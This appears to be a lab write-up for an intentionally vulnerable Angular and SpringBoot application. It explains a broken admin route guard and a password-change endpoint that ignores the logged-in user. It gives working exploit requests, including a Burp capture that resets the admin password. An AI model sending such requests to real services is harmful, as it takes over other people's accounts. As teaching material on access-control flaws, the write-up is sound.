# Broken Access Control
Broken Access Control doesn't or improperly verifies authorities/permissions to a resource.  Devastating loss of confidentiality, integrity, and potentially availability may occur depending on the resource not assessed correctly.

## Exploitation
**Prerequisites:** _Authenticated_

**Location:** _Admin.guard & PUT /users_

The Angular application and SpringBoot both have Broken Access Control.  Angular incorrectly validates Admin-level locations by checking if the user is authenticated _or_ ADMIN-ROLE (admin or authenticated) instead of authenticated _and_ ADMIN-ROLE (admin and authenticated), ultimately allowing normal authenticated users to access these resources.  SpringBoot, while checks for authentication, does not utilize username of authenticated user to change passwords.  This means that any user can change another user's password if they know the username.  Below are two exploitation examples, one connecting to an admin resource as a normal authenticated user (Angular) and the other changing another user's password (SpringBoot):

*Angular Broken Access Control*

    GET http://localhost:4200/admin/products


Successful exploitation looks like:
![Alt text](../images/bac.png?raw=true "Angular Broken Access Control")

*SpringBoot Broken Access Control*

    PUT /users
    raw:
    {
        "username":"admin",
        "newPassword":"password1!"
    }

Successful exploitation looks like:

    {
        "success": true,
        "code": 200,
        "message": "Password updated successfully."
    }

## Burp Suite Example Exploitation

    PUT /users HTTP/1.1
    Host: 127.0.0.1:8081
    Content-Length: 47
    sec-ch-ua: "Chromium";v="109", "Not_A Brand";v="99"
    Accept: application/json, text/plain, */*
    Content-Type: application/json
    sec-ch-ua-mobile: ?0
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
    sec-ch-ua-platform: "Windows"
    Origin: http://127.0.0.1:4200
    Sec-Fetch-Site: same-site
    Sec-Fetch-Mode: cors
    Sec-Fetch-Dest: empty
    Referer: http://127.0.0.1:4200/
    Accept-Encoding: gzip, deflate
    Accept-Language: en-US,en;q=0.9
    Cookie: JSESSIONID=D5FE8244B27DF4207B4BEC89ABE97921
    Connection: close

    {"username":"admin","newPassword":"password1!"}

